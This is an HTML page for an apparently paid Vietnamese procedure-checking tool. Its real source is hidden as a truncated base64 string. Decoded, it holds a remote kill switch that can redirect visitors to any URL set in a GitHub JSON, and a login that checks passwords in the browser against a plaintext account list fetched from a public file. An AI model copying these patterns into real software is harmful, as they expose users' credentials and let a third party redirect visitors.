<!-- 

///////////////////////////////////////////////
/////Code được viết bởi Chauhuynh0104/////////
////http://fb.com/chauhuynh0104//////////////
/////////////079.567.9350///////////////////
///Vui lòng tôn trọng bản quyền tác giả////
/////////Không xoá dòng này //////////////
/////////////////////////////////////////

!-->
<!DOCTYPE html>
<html lang="vi">
<head><meta charset="UTF-8"><title>Thủ Thuật</title></head>
<body>
<script>
  const base64 = "PCEtLSANCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vLy9Db2RlIMSRxrDhu6NjIHZp4bq/dCBi4bufaSBDaGF1aHV5bmgwMTA0Ly8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vL2h0dHA6Ly9mYi5jb20vY2hhdWh1eW5oMDEwNC8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLzA3OS41NjcuOTM1MC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQovLy8vLy8vLy8vLy9WdWkgbMOybmcgdMO0biB0cuG7jW5nIGLhuqNuIHF1eeG7gW4gdMOhYyBnaeG6oy8vLy8vLy8vLy8vDQovLy8vLy8vLy8vLy8vLy8vLy9LaMO0bmcgeG/DoSBkw7JuZyBuw6B5IC8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQovLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KIS0tPg0KPCFET0NUWVBFIGh0bWw+DQoNCjxodG1sIGxhbmc9InZpIj4NCjxoZWFkPg0KPGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3MyP2ZhbWlseT1JbnRlcjp3Z2h0QDQwMDs2MDA7NzAwJmFtcDtkaXNwbGF5PXN3YXAiIHJlbD0ic3R5bGVzaGVldCIvPg0KPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZm9udC1hd2Vzb21lLzYuNC4wL2Nzcy9hbGwubWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ii8+DQo8bWV0YSBjaGFyc2V0PSJ1dGYtOCIvPg0KPG1ldGEgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCIgbmFtZT0idmlld3BvcnQiLz4NCjx0aXRsZT5LaeG7g20gVHJhIFRo4bunIFRodeG6rXQ8L3RpdGxlPg0KPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2NoYXVodXluaDAxMDQuZ2l0aHViLmlvL2d5bS9naWFvZGllbi5jc3MiPg0KPCEtLSBFbWFpbEpTIFNESyAtLT4NCjxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL0BlbWFpbGpzL2Jyb3dzZXJANC9kaXN0L2VtYWlsLm1pbi5qcyI+PC9zY3JpcHQ+DQo8c2NyaXB0Pg0KICAoZnVuY3Rpb24oKXsNCiAgICBlbWFpbGpzLmluaXQoIi1ZRkZtSEpQOXpVSmFucXVLIik7IC8vIPCfkYggdGhheSBi4bqxbmcgUHVibGljIEtleSBj4bunYSBi4bqhbg0KICB9KSgpOw0KPC9zY3JpcHQ+DQo8c2NyaXB0Pg0KICAgIGFzeW5jIGZ1bmN0aW9uIGNoZWNrQWNjZXNzKCkgew0KICAgICAgICBjb25zdCBqc29uVXJsID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jaGF1aHV5bmgwMTA0L2NoYXVodXluaDAxMDQudHh0L3JlZnMvaGVhZHMvbWFpbi9kcmNoYXUuanNvbic7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBjb25zdCByZXMgPSBhd2FpdCBmZXRjaChqc29uVXJsKTsNCiAgICAgICAgICAgIGlmICghcmVzLm9rKSB0aHJvdyBuZXcgRXJyb3IoJ0tow7RuZyB0aOG7gyB04bqjaSBmaWxlIEpTT04nKTsNCiAgICAgICAgICAgIGNvbnN0IGNvbmZpZyA9IGF3YWl0IHJlcy5qc29uKCk7DQoNCiAgICAgICAgICAgIGlmICghY29uZmlnLkFDQ0VTU19BTExPV0VEKSB7DQogICAgICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSBgPGRpdiBzdHlsZT0icGFkZGluZzo1MHB4O3RleHQtYWxpZ246Y2VudGVyO2NvbG9yOnJlZDtmb250LXNpemU6MjBweCI+DQogICAgICAgICAgICAgICAgICAgIDxoMj5C4bqiTyBUUsOMIEjhu4YgVEjhu5BORzwvaDI+DQogICAgICAgICAgICAgICAgICAgIDxwPiR7Y29uZmlnLk1FU1NBR0V9PC9wPg0KICAgICAgICAgICAgICAgICAgICAke2NvbmZpZy5SRURJUkVDVF9VUkwgPyBgPHA+U+G6vSBjaHV54buDbiBoxrDhu5tuZyBzYXUgPHNwYW4gaWQ9J2NvdW50ZG93bic+NTwvc3Bhbj4gZ2nDonkuLi48L3A+YCA6ICcnfQ0KICAgICAgICAgICAgICAgIDwvZGl2PmA7DQogICAgICAgICAgICAgICAgaWYgKGNvbmZpZy5SRURJUkVDVF9VUkwpIHsNCiAgICAgICAgICAgICAgICAgICAgbGV0IHNlY29uZHMgPSA1Ow0KICAgICAgICAgICAgICAgICAgICBjb25zdCB0aW1lciA9IHNldEludGVydmFsKCgpID0+IHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlY29uZHMtLTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdjb3VudGRvd24nKS5pbm5lclRleHQgPSBzZWNvbmRzOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHNlY29uZHMgPD0gMCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwodGltZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5sb2NhdGlvbi5ocmVmID0gY29uZmlnLlJFRElSRUNUX1VSTDsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfSwgMTAwMCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICB9IGNhdGNoIChlcnIpIHsNCiAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuaW5uZXJIVE1MID0gYDxkaXYgc3R5bGU9J3BhZGRpbmc6NTBweDt0ZXh0LWFsaWduOmNlbnRlcjtjb2xvcjpyZWQnPg0KICAgICAgICAgICAgICAgIDxoMj5LSMOUTkcgVOG6okkgxJDGr+G7okMgQ+G6pFUgSMOMTkg8L2gyPjxwPkzhu5dpIHRydXkgY+G6rXAga2hpIGvhur90IG7hu5FpIG3huqFuZy48YnIvPiBWdWkgbMOybmcga2nhu4NtIHRyYSBs4bqhaSDEkcaw4budbmcgdHJ1eeG7gW4gaW50ZXJuZXQuPC9wPg0KICAgICAgICAgICAgPC9kaXY+YDsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIGFzeW5jIGZ1bmN0aW9uIGxvYWRBY2NvdW50c0Zyb21UWFQoKSB7DQogICAgICAgIGNvbnN0IHR4dFVybCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hhdWh1eW5oMDEwNC9jaGF1aHV5bmgwMTA0LnR4dC9yZWZzL2hlYWRzL21haW4vdGtrLnR4dCc7DQogICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKHR4dFVybCk7DQogICAgICAgIGNvbnN0IHRleHQgPSBhd2FpdCByZXMudGV4dCgpOw0KICAgICAgICBjb25zdCBhY2NvdW50cyA9IHt9Ow0KICAgICAgICB0ZXh0LnNwbGl0KCdcbicpLmZvckVhY2gobGluZSA9PiB7DQogICAgICAgICAgICBjb25zdCBbdSwgcF0gPSBsaW5lLnRyaW0oKS5zcGxpdCgnOicpOw0KICAgICAgICAgICAgaWYgKHUgJiYgcCkgYWNjb3VudHNbdV0gPSBwOw0KICAgICAgICB9KTsNCiAgICAgICAgcmV0dXJuIGFjY291bnRzOw0KICAgIH0NCg0KICAgIGFzeW5jIGZ1bmN0aW9uIGVuYWJsZUxvZ2luKGFjY291bnRzKSB7DQogICAgICAgIGNvbnN0IGJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkJ0bicpOw0KICAgICAgICBjb25zdCB1c2VySW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndXNlcm5hbWVJbnB1dCcpOw0KICAgICAgICBjb25zdCBwYXNzSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dvcmRJbnB1dCcpOw0KICAgICAgICBjb25zdCBlcnJvckRpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkVycm9yJyk7DQoNCiAgICAgICAgYnRuLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gew0KICAgICAgICAgICAgY29uc3QgdXNlciA9IHVzZXJJbnB1dC52YWx1ZS50cmltKCk7DQogICAgICAgICAgICBjb25zdCBwYXNzID0gcGFzc0lucHV0LnZhbHVlLnRyaW0oKTsNCiAgICAgICAgICAgIGlmIChhY2NvdW50c1t1c2VyXSAmJiBhY2NvdW50c1t1c2VyXSA9PT0gcGFzcykgew0KICAgICAgICAgICAgICAgIHNlc3Npb25TdG9yYWdlLnNldEl0ZW0oJ21lZFVzZXInLCB1c2VyKTsNCiAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LmNsYXNzTGlzdC5yZW1vdmUoJ2xvZ2luLXBhZ2UnKTsNCiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5TZWN0aW9uJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFpbkNvbnRlbnQnKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgICAgICAgICBlcnJvckRpdi5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBlcnJvckRpdi5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSk7DQogICAgfQ0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsIGZ1bmN0aW9uKCkgew0KICAvLyBHw6FuIHPhu7Ega2nhu4duIGNobyBkcm9wZG93biBs4buNYyBtw6F5DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVPcGVyYXRvclNlbGVjdCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZpbHRlck1hY2hpbmVFcnJvcnNCeU9wZXJhdG9yKTsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZUNvbmZsaWN0T3BlcmF0b3JTZWxlY3QnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmaWx0ZXJNYWNoaW5lQ29uZmxpY3RzQnlPcGVyYXRvcik7DQoJIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtaXNzaW5nTWFjaGluZU9wZXJhdG9yU2VsZWN0JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZmlsdGVyTWlzc2luZ01hY2hpbmVCeU9wZXJhdG9yKTsNCgkgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2RhdGVNaXNtYXRjaE9wZXJhdG9yU2VsZWN0JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZmlsdGVyRGF0ZU1pc21hdGNoQnlPcGVyYXRvcik7DQoNCmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaG93TW9yZVN1Z2dlc3Rpb25zQ2hlY2tib3gnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmdW5jdGlvbigpIHsNCiAgICBpZiAoYWxsUHJvY2VkdXJlcy5sZW5ndGggPiAwKSB7DQogICAgICAgIGdlbmVyYXRlVGltZVN1Z2dlc3Rpb25zKGFsbFByb2NlZHVyZXMpOw0KICAgICAgICBmaWx0ZXJCeU9wZXJhdG9yKCk7DQogICAgfQ0KfSk7DQp9KTsNCg0KIHdpbmRvdy5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgYXN5bmMgKCkgPT4gew0KICBjb25zdCBhbGxvdyA9IGF3YWl0IGNoZWNrQWNjZXNzKCk7DQogIGlmICghYWxsb3cpIHJldHVybjsNCiAgLy8gQ2jhu4kga2nhu4NtIHRyYSDEkcSDbmcgbmjhuq1wIMSRw6MgbMawdTsgS0jDlE5HIHThuqNpIHJ1bGUvcHJvY2VkdXJlcyDhu58gxJHDonkNCiAgY2hlY2tTYXZlZExvZ2luKCk7DQp9KTsNCg0KPC9zY3JpcHQ+DQoNCg0KDQoNCjwvaGVhZD4NCjxib2R5Pg0KDQo8IS0tIFRIRU1FIFBJQ0tFUiAtLT4NCjxkaXYgaWQ9InRoZW1lUGlja2VyIiBjbGFzcz0idGhlbWUtcGlja2VyIiB0aXRsZT0iQ2jhu41uIG3DoHUgY2jhu6cgxJHhu4EgZ2lhbyBkaeG7h24iPg0KIA0KIA0KICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9InRoZW1lLXN3YXRjaCIgZGF0YS10aGVtZT0iZGVmYXVsdCIgc3R5bGU9Ii0tc3dhdGNoOiMzNDk4ZGIiIGFyaWEtbGFiZWw9Ik3hurdjIMSR4buLbmggKFhhbmggZMawxqFuZykiPjwvYnV0dG9uPg0KICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9InRoZW1lLXN3YXRjaCIgZGF0YS10aGVtZT0ib3JhbmdlIiAgc3R5bGU9Ii0tc3dhdGNoOiNGRjY2MDAiIGFyaWEtbGFiZWw9Ik3DoHUgY2FtIj48L2J1dHRvbj4NCiAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJ0aGVtZS1zd2F0Y2giIGRhdGEtdGhlbWU9InJlZCIgICAgIHN0eWxlPSItLXN3YXRjaDojRkYwMDAwIiBhcmlhLWxhYmVsPSJNw6B1IMSR4buPIj48L2J1dHRvbj4NCiAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJ0aGVtZS1zd2F0Y2giIGRhdGEtdGhlbWU9ImdyZWVuIiAgIHN0eWxlPSItLXN3YXRjaDojMDBBQTAwIiBhcmlhLWxhYmVsPSJNw6B1IHhhbmggbMOhIj48L2J1dHRvbj4NCiAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBpZD0iZGFya1RvZ2dsZSIgY2xhc3M9InRoZW1lLWRhcmstdG9nZ2xlIiBvbmNsaWNrPSJ0b2dnbGVEYXJrTW9kZSgpIiBhcmlhLWxhYmVsPSJC4bqtdC9U4bqvdCBjaOG6vyDEkeG7mSB04buRaSI+DQogICAgPHNwYW4gaWQ9ImRhcmtJY29uIj48c21hbGw+8J+MmTwvc21hbGw+PC9zcGFuPiA8c3BhbiBpZD0iZGFya1RleHQiPlThu5FpPC9zcGFuPg0KICA8L2J1dHRvbj4NCiAgDQo8L2Rpdj4NCg0KDQoNCg0KPHNjcmlwdD4NCiAgICAgIGZ1bmN0aW9uIHRvZ2dsZURhcmtNb2RlKCkgew0KICAgICAgICBjb25zdCBib2R5ID0gZG9jdW1lbnQuYm9keTsNCiAgICAgICAgY29uc3QgaWNvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJkYXJrSWNvbiIpOw0KICAgICAgICBjb25zdCB0ZXh0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImRhcmtUZXh0Iik7DQogICAgICAgIGJvZHkuY2xhc3NMaXN0LnRvZ2dsZSgiZGFyay1tb2RlIik7DQogICAgICAgIGNvbnN0IGlzRGFyayA9IGJvZHkuY2xhc3NMaXN0LmNvbnRhaW5zKCJkYXJrLW1vZGUiKTsNCiAgICAgICAgaWNvbi50ZXh0Q29udGVudCA9IGlzRGFyayA/ICLimIDvuI8iIDogIvCfjJkiOw0KICAgICAgICB0ZXh0LnRleHRDb250ZW50ID0gaXNEYXJrID8gIlPDoW5nIiA6ICJU4buRaSI7DQogICAgICB9DQogICAgPC9zY3JpcHQ+DQo8c2NyaXB0Pg0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsICgpID0+IHsNCi8vIEzhuqV5IGPDoWMgcGjhuqduIHThu60NCiAgICAgICAgICAgIGNvbnN0IHRyaWdnZXJCdXR0b24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndHJpZ2dlckJ1dHRvbicpOw0KICAgICAgICAgICAgY29uc3QgZmlsZUlucHV0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVJbnB1dCcpOw0KDQogICAgICAgICAgICAvLyBLaeG7g20gdHJhIHhlbSBwaOG6p24gdOG7rSBjw7MgdOG7k24gdOG6oWkga2jDtG5nDQogICAgICAgICAgICBpZiAoIXRyaWdnZXJCdXR0b24gfHwgIWZpbGVJbnB1dCkgew0KICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ0zhu5dpOiBLaMO0bmcgdMOsbSB0aOG6pXkgdHJpZ2dlckJ1dHRvbiBob+G6t2MgZmlsZUlucHV0Jyk7DQogICAgICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAvLyBUaMOqbSBz4buxIGtp4buHbiBjbGljayBjaG8gYnV0dG9uDQogICAgICAgICAgICB0cmlnZ2VyQnV0dG9uLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gew0KICAgICAgICAgICAgICAgIGZpbGVJbnB1dC5jbGljaygpOyAvLyBLw61jaCBob+G6oXQgaW5wdXQgZmlsZQ0KICAgICAgICAgICAgfSk7DQoNCiAgICAgICAgfSk7DQoNCjwvc2NyaXB0Pg0KDQoNCg0KDQoNCjwhLS0gUE9QVVAgTVVBIELhuqJOIFFVWeG7gE4gLS0+DQo8ZGl2IGlkPSJidXlQb3B1cCIgY2xhc3M9InBvcHVwLW92ZXJsYXkiIHN0eWxlPSJkaXNwbGF5Om5vbmU7Ij4NCiAgPGRpdiBjbGFzcz0icG9wdXAtY29udGVudCBsdXh1cnkiPg0KICAgIDxoMiBjbGFzcz0icG9wdXAtdGl0bGUiPkLhuqJORyBHScOBIELhuqJOIFFVWeG7gE48L2gyPg0KICAgIDxkaXYgY2xhc3M9InByaWNpbmctZ3JpZCI+DQogICAgICA8ZGl2IGNsYXNzPSJwcmljZS1jYXJkIj4NCiAgICAgICAgPGgzPjEgVGjDoW5nPC9oMz4NCiAgICAgICAgPHAgY2xhc3M9InByaWNlIj4xLjAwMC4wMDAgVk7EkDwvcD4NCiAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnV5LWJ0biIgb25jbGljaz0ib3BlblBheW1lbnQoJzEgVGjDoW5nJywgJzEuMDAwLjAwMCBWTsSQJykiPk11YSBuZ2F5PC9idXR0b24+DQogICAgICA8L2Rpdj4NCiAgICAgIDxkaXYgY2xhc3M9InByaWNlLWNhcmQiPg0KICAgICAgICA8aDM+NiBUaMOhbmc8L2gzPg0KICAgICAgICA8cCBjbGFzcz0icHJpY2UiPjUuMDAwLjAwMCBWTsSQPC9wPg0KICAgICAgICA8YnV0dG9uIGNsYXNzPSJidXktYnRuIiBvbmNsaWNrPSJvcGVuUGF5bWVudCgnNiBUaMOhbmcnLCAnNS4wMDAuMDAwIFZOxJAnKSI+TXVhIG5nYXk8L2J1dHRvbj4NCiAgICAgIDwvZGl2Pg0KICAgICAgPGRpdiBjbGFzcz0icHJpY2UtY2FyZCI+DQogICAgICAgIDxoMz4xIE7Eg208L2gzPg0KICAgICAgICA8cCBjbGFzcz0icHJpY2UiPjEwLjAwMC4wMDAgVk7EkDwvcD4NCiAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnV5LWJ0biIgb25jbGljaz0ib3BlblBheW1lbnQoJzEgTsSDbScsICcxMC4wMDAuMDAwIFZOxJAnKSI+TXVhIG5nYXk8L2J1dHRvbj4NCiAgICAgIDwvZGl2Pg0KICAgICAgPGRpdiBjbGFzcz0icHJpY2UtY2FyZCI+DQogICAgICAgIDxoMz41IE7Eg208L2gzPg0KICAgICAgICA8cCBjbGFzcz0icHJpY2UiPjQwLjAwMC4wMDAgVk7EkDwvcD4NCiAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnV5LWJ0biIgb25jbGljaz0ib3BlblBheW1lbnQoJzUgTsSDbScsICc0MC4wMDAuMDAwIFZOxJAnKSI+TXVhIG5nYXk8L2J1dHRvbj4NCiAgICAgIDwvZGl2Pg0KICAgIDwvZGl2Pg0KICAgIDxidXR0b24gY2xhc3M9ImNsb3NlLWJ0biIgb25jbGljaz0iY2xvc2VCdXlQb3B1cCgpIj7EkMOzbmc8L2J1dHRvbj4NCiAgPC9kaXY+DQo8L2Rpdj4NCg0KPCEtLSBQT1BVUCBUSEFOSCBUT8OBTiAtLT4NCjxkaXYgaWQ9InBheW1lbnRQb3B1cCIgY2xhc3M9InBvcHVwLW92ZXJsYXkiIHN0eWxlPSJkaXNwbGF5Om5vbmU7Ij4NCiAgPGRpdiBjbGFzcz0icG9wdXAtY29udGVudCBmb3JtLXBvcHVwIj4NCiAgICA8aDI+WMOBQyBOSOG6rE4gVEhBTkggVE/DgU48L2gyPjxici8+DQoJPGxhYmVsPjxmb250IGNvbG9yPSJyZWQiPjxiPlZ1aSBsw7JuZyB0aGFuaCB0b8OhbiB0csaw4bubYyB2w6AgxJHhu6NpIGLhu5kgcGjhuq1uIGvhu7kgdGh14bqtdCBsacOqbiBo4buHPC9iPjwvZm9udD48L2xhYmVsPjxici8+PGJyLz4NCiAgICA8Zm9ybSBpZD0icGF5bWVudEZvcm0iPg0KICAgICAgPGxhYmVsPlPhu5EgdMOgaSBraG/huqNuIHRo4bulIGjGsOG7n25nOiA8Yj4xNzk1Njc5MzUwPC9iPjwvbGFiZWw+PGJyLz4NCgkgICA8bGFiZWw+VMOqbiB0w6BpIGtob+G6o246IDxiPkh14buzbmggTmfhu41jIENow6J1PC9iPjwvbGFiZWw+PGJyLz4NCiAgICAgIDxsYWJlbD5OZ8OibiBow6BuZzogPGI+VmlldGNvbWJhbms8L2I+PC9sYWJlbD48YnIvPjxici8+DQogICAgICA8bGFiZWw+U+G7kSB0aeG7gW4gY+G6p24gdGhhbmggdG/DoW46PC9sYWJlbD4NCiAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBpZD0ibW9uZXkiIHJlYWRvbmx5Pjxici8+DQogICAgIDxsYWJlbD5T4buRIHTDoGkga2hv4bqjbiBuZ8aw4budaSBtdWE6PC9sYWJlbD4NCjxpbnB1dCB0eXBlPSJ0ZXh0IiBpZD0iYnV5ZXJBY2MiIHJlcXVpcmVkPjxici8+DQoNCjxsYWJlbD5OZ8OibiBow6BuZyBuZ8aw4budaSBtdWE6PC9sYWJlbD4NCjxzZWxlY3QgaWQ9ImJ1eWVyQmFuayIgcmVxdWlyZWQ+DQogIDxvcHRpb24gdmFsdWU9IiI+LS0gQ2jhu41uIG5nw6JuIGjDoG5nIC0tPC9vcHRpb24+DQogIDxvcHRpb24+QWdyaWJhbmsgLSBOZ8OibiBow6BuZyBOw7RuZyBuZ2hp4buHcCAmIFBUTlQgVmnhu4d0IE5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPlZpZXRjb21iYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBOZ2/huqFpIHRoxrDGoW5nIFZp4buHdCBOYW08L29wdGlvbj4NCiAgPG9wdGlvbj5WaWV0aW5CYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBDw7RuZyBUaMawxqFuZyBWaeG7h3QgTmFtPC9vcHRpb24+DQogIDxvcHRpb24+QklEViAtIE5nw6JuIGjDoG5nIFRNQ1AgxJDhuqd1IHTGsCB2w6AgUGjDoXQgdHJp4buDbiBWaeG7h3QgTmFtPC9vcHRpb24+DQogIDxvcHRpb24+QUNCIC0gTmfDom4gaMOgbmcgw4EgQ2jDonU8L29wdGlvbj4NCiAgPG9wdGlvbj5TYWNvbWJhbmsgLSBOZ8OibiBow6BuZyBUTUNQIFPDoGkgR8OybiBUaMawxqFuZyBUw61uPC9vcHRpb24+DQogIDxvcHRpb24+VGVjaGNvbWJhbmsgLSBOZ8OibiBow6BuZyBUTUNQIEvhu7kgdGjGsMahbmcgVmnhu4d0IE5hbTwvb3B0aW9uPg0KICA8b3B0aW9uPk1CQmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgUXXDom4gxJHhu5lpPC9vcHRpb24+DQogIDxvcHRpb24+VFBCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBUacOqbiBQaG9uZzwvb3B0aW9uPg0KICA8b3B0aW9uPlZQQmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgVmnhu4d0IE5hbSBUaOG7i25oIFbGsOG7o25nPC9vcHRpb24+DQogIDxvcHRpb24+SERCYW5rIC0gTmfDom4gaMOgbmcgVE1DUCBQaMOhdCB0cmnhu4NuIFRQIEjhu5MgQ2jDrSBNaW5oPC9vcHRpb24+DQogIDxvcHRpb24+RXhpbWJhbmsgLSBOZ8OibiBow6BuZyBUTUNQIFh14bqldCBOaOG6rXAga2jhuql1IFZp4buHdCBOYW08L29wdGlvbj4NCiAgPG9wdGlvbj5TSEIgLSBOZ8OibiBow6BuZyBUTUNQIFPDoGkgR8OybiAtIEjDoCBO4buZaTwvb3B0aW9uPg0KICA8b3B0aW9uPlNlQUJhbmsgLSBOZ8OibiBow6BuZyBUTUNQIMSQw7RuZyBOYW0gw4E8L29wdGlvbj4NCiAgPG9wdGlvbj5TQ0IgLSBOZ8OibiBow6BuZyBUTUNQIFPDoGkgR8Oybjwvb3B0aW9uPg0KICA8b3B0aW9uPk9DQiAtIE5nw6JuIGjDoG5nIFRNQ1AgUGjGsMahbmcgxJDDtG5nPC9vcHRpb24+DQogIDxvcHRpb24+VklCIC0gTmfDom4gaMOgbmcgVE1DUCBRdeG7kWMgdOG6vyBWaeG7h3QgTmFtPC9vcHRpb24+DQogIDxvcHRpb24+UFZjb21CYW5rIC0gTmfDom4gaMOgbmcgVE1DUCDEkOG6oWkgQ2jDum5nIFZp4buHdCBOYW08L29wdGlvbj4NCiAgPG9wdGlvbj5OYW1BQmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgTmFtIMOBPC9vcHRpb24+DQogIDxvcHRpb24+T2NlYW5CYW5rIC0gTmfDom4gaMOgbmcgVE0gVE5ISCBNVFYgxJDhuqFpIETGsMahbmc8L29wdGlvbj4NCiAgPG9wdGlvbj5CYWNBQmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgQuG6r2Mgw4E8L29wdGlvbj4NCiAgPG9wdGlvbj5BQkJBTksgLSBOZ8OibiBow6BuZyBUTUNQIEFuIELDrG5oPC9vcHRpb24+DQogIDxvcHRpb24+QuG6o28gVmnhu4d0IEJhbmsgLSBOZ8OibiBow6BuZyBUTUNQIELhuqNvIFZp4buHdDwvb3B0aW9uPg0KICA8b3B0aW9uPktpw6puIExvbmcgQmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgS2nDqm4gTG9uZzwvb3B0aW9uPg0KICA8b3B0aW9uPlZpZXRDYXBpdGFsQmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgQuG6o24gVmnhu4d0PC9vcHRpb24+DQogIDxvcHRpb24+TkNCIC0gTmfDom4gaMOgbmcgVE1DUCBRdeG7kWMgRMOibjwvb3B0aW9uPg0KICA8b3B0aW9uPkxQQmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgQsawdSDEkWnhu4duIExpw6puIFZp4buHdDwvb3B0aW9uPg0KICA8b3B0aW9uPlBHIEJhbmsgLSBOZ8OibiBow6BuZyBUTUNQIFjEg25nIGThuqd1IFBldHJvbGltZXg8L29wdGlvbj4NCiAgPG9wdGlvbj5WaWV0QmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgVmnhu4d0IE5hbSBUaMawxqFuZyBUw61uPC9vcHRpb24+DQogIDxvcHRpb24+U2FpZ29uQmFuayAtIE5nw6JuIGjDoG5nIFRNQ1AgU8OgaSBHw7JuIEPDtG5nIFRoxrDGoW5nPC9vcHRpb24+DQogIDxvcHRpb24+Q08tT1AgQmFuayAtIE5nw6JuIGjDoG5nIEjhu6NwIHTDoWMgeMOjIFZp4buHdCBOYW08L29wdGlvbj4